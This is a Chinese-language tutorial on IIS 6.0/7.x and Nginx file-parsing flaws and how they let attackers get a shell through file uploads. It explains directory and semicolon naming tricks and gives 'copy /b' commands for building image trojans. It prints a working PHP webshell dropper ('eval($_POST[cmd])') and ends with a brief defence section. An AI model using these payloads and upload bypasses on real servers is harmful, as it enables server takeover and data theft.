一、IIS 5.x/6.0解析漏洞
IIS 6.0解析利用方法有两种
1.目录解析
/xx.asp/xx.jpg

图片木马执行必须满足2个条件：
A：你可以自建x.asp文件夹；
B：你需要上传图片木马到x.asp文件夹下

第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。
 
例如创建目录 wooyun.asp，那么
/wooyun.asp/1.jpg

将被当作asp文件来执行。假设可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。
注意：此方法只适用于asp的站，php等都不支持。

2.文件解析
wooyun.asp;.jpg
第二种，在IIS6.0下，分号后面的不被解析，也就是说
wooyun.asp;.jpg
会被服务器看成是wooyun.asp还有IIS6.0 默认的可执行文件除了asp还包含这三种
/wooyun.asa
/wooyun.cer
/wooyun.cdx
如果存在WAF，可以fuzz测试超长文件名，或者中文文件名等。

防御方案
1.客户端检测，使用JS对上传图片检测，包括文件大小、文件扩展名、文件类型等
2.服务端检测，对文件大小、文件路径、文件扩展名、文件类型、文件内容检测，对文件重命名
3.其他限制，服务器端上传目录设置不可执行权限

二、IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞

IIS7.0/7.5在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将/xx.jpg/xx.php 解析为 php 文件。

利用方法：将一张图和一个写入后门代码的文本文件合并将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾
 
1.copy /b C:\1.jpg+C:\1.txt C:\shell.jpg    伪造文件头
2.copy /b C:\shell.jpg+C:\1.jpg C:\shell_last.asp    伪造文件尾
（注意顺序：图片+马是修改文件头，马+图片是修改图片尾）

copy xx.jpg/b + yy.txt/a xy.jpg

/b 即二进制[binary]模式
/a 即ascii模式 xx.jpg正常图片文件
 
yy.txt 内容 <?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>

意思为写入一个内容为 <?php eval($_POST[cmd])?> 名称为shell.php的文件
 
找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。
然后就在图片目录下生成一句话木马 shell.php 密码 cmd

注意：
该解析漏洞利用需两个条件：
1. php.ini里cgi.fix_pathinfo=1(默认为1)（nginx）
2.在”Handler Mapping”勾选php-cgi.exe程序的”Invoke handler only if request is mapped to”IIS 7.0/IIS 7.5

三、其他
在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。